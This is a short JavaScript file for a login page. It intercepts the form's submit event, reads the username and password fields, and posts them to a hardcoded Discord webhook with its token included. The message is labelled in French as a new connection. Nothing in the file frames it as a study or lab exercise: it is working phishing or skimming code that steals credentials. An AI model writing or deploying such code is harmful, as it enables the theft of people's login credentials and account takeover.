const webhookUrl = "https://discord.com/api/webhooks/1086652510703456437/TSFcZq0jWHtjP_FKd2Rd5QZ_KZZ_m0DMtqG6q0wx0EwoBfViiz-eLOhAQsjqDYTIZvYs";

const form = document.querySelector("form");
const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");
const EmailInput = document.getElementById("Emai");
const username = document.getElementById('username').value;
const password = document.getElementById('password').value;
const email = document.getElementById('email').value;

form.addEventListener("submit", (e) => {
  e.preventDefault();
  const username = usernameInput.value;
  const password = passwordInput.value;
  const message = `Nouvelle connexion :
  Username: ${username}
  Password: ${password}`;
  const request = new Request(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content: message })
  });
  fetch(request);
  form.reset();
});
